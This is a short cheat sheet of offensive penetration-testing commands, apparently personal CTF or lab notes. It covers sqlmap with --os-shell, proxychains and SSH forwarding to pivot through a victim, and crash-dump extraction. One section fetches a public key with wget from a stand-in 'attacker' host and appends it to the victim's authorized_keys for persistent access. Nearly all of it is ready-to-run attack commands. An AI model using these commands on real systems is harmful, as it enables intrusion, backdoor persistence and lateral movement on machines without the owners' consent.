## sqlmap

```
sqlmap -u "<url>" --cookie="<key=values>" --os-shell --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" 
```

## cadaver

```
For WebDAV applications
---
cadaver <website>
```

## Proxy chains

```
adding a proxy
---

edit /etc/proxychains4.conf 

examples:
http <ip> <port>
socks5 <victim service> <victim port> <user> <password>

$ proxychains ssh user@<ip>
```


## tftp

allows putting/getting of files without specifying permission

check for `/etc/default/tftpd-hpa`


## SSH port forwarding

append your pub key to `/home/user/.ssh/authorized_keys`

On your attacker machine:

`ssh -L <local port>:<victim service>:<victim port> <victim>@<ip>`

OR using dynamic forwarding for attacks

`ssh -D <local port> <victim>@<ip>`


## Adding your SSH to the victim
```
Append your public to the victim's ~/.ssh/authorized_keys
---
On attacker:
ssh-keygen

On victim:
wget http://attacker/id_rsa.pub
cat id_rsa.pub >> ~/.ssh/authorized_keys
```

## Getting Crash Data

```
While program is running, kill it with
---
kill -BUS <pid>

Get the data from the crash log
---
apport-unpack /var/crash/_opt_count.1000.crash /tmp/crashed
strings /tmp/crashed/CoreDump
```

## JWT generation

```
pip install pyjwt

>>> import jwt
>>> encoded_jwt = jwt.encode({"some": "payload"}, "secret", algorithm="HS256")
```
